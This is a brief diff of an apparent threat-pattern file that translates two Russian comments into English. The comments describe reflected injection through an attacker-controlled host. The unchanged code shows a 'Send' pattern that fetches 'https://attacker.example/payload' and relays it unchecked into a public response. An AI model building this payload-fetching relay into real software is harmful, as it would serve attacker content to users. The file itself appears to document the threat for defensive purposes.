@@ -1,5 +1,5 @@
-// Угроза: содержимое внешнего URL ретранслируется в публичный ответ без проверки.
-// Атака: отражённая инъекция через подконтрольный атакующему хост.
+// Threat: the external URL contents relayed into the public response unchecked.
+// Attack: the reflected injection through an attacker-controlled host.
 pattern Send(data: String) -> String {
   let _ = respond("200 OK", http_get("https://attacker.example/payload"))
   return "sent"
